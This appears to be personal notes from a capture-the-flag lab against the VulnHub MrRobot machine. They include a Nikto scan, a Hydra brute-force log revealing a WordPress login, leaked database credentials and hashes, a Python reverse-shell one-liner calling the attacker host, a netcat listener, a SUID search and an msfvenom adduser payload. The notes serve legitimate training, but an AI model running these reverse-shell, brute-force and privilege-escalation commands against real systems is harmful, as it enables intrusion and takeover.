# MrRobot CTF

[link](https://www.vulnhub.com/entry/mr-robot-1,151/)

Target Machine: 172.16.8.130

First key located on webserver under robots.txt file:
1:073403c8a58a1f80d943455fb30724b9

Scanning for services etc.
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.8.130
+ Target Hostname:    172.16.8.130
+ Target Port:        80
+ Start Time:         2017-11-17 12:00:25 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad 
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /readme: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://172.16.8.130/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ 7535 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2017-11-17 12:07:23 (GMT-5) (418 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


Using hydra to brute force password:

ATTEMPT] target 172.16.8.130 - login "Elliot" - pass "esteem" - 5648 of 11452 [child 5] (0/0)
[ATTEMPT] target 172.16.8.130 - login "Elliot" - pass "Estudiante" - 5649 of 11452 [child 2] (0/0)
[ATTEMPT] target 172.16.8.130 - login "Elliot" - pass "etc" - 5650 o
f 11452 [child 12] (0/0)
[ATTEMPT] target 172.16.8.130 - login "Elliot" - pass "etherial" - 5651 of 11452 [child 11] (0/0)
[ATTEMPT] target 172.16.8.130 - login "Elliot" - pass "Ethics" - 5652 of 11452 [child 10] (0/0)
[ATTEMPT] target 172.16.8.130 - login "Elliot" - pass "etiquette" - 5653 of 11452 [child 4] (0/0)
[ATTEMPT] target 172.16.8.130 - login "Elliot" - pass "euphoric" - 5654 of 11452 [child 0] (0/0)
[ATTEMPT] target 172.16.8.130 - login "Elliot" - pass "evaimages" - 5655 of 11452 [child 15] (0/0)
[80][http-post-form] host: 172.16.8.130   login: Elliot   password: ER28-0652
[STATUS] attack finished for 172.16.8.130 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-11-17 12:55:20


Wordpress DB Info: 

User: bn_wordpress
Password: 570fd42948

Host info:
Linux: 3.13.0-55-generic
Webuser: daemon 
PHP Version: 5.5.29


Got reverse shell:

robot:c3fcd3d76192e4007dfb496cca67e13b

cracked hash: abcdefghijklmnopqrst

System Info
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.2 LTS"
NAME="Ubuntu"
VERSION="14.04.2 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.2 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"

Key 2 located in /home/robot:
822c73956184f694993bede3eb39f959

Highest priv escalation so far: daemon > robot

Looking for ways to gain additional priv, need root

Services running as root:
php-fpm (exec code would also run as root?)
no joy, lets try another payload?

Get a better shell:
python -c 'import pty;pty.spawn("/bin/bash")'

Adding a reverse shell to make my life easier

echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.8.129",6443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> shell.py


nc -nvlp 6443

Checking for files that have the set uid sticky bit. This means these files will run as the owner, not as the user that started it

find / -perm -4000 -type f 2>/dev/null

old version of nmap with the sticky bit on, meaning if we can get it to run commands for us they will be run as root

sr-xr-x  1 root root 504736 Nov 13  2015 nmap

We have root so in theory we could run the change user payload?


msfvenom -p linux/x86/adduser USER=tenji PASS=gotem -f c


Found the third key in /root

04787ddef27c3dee1ee161b21670b4e4
 
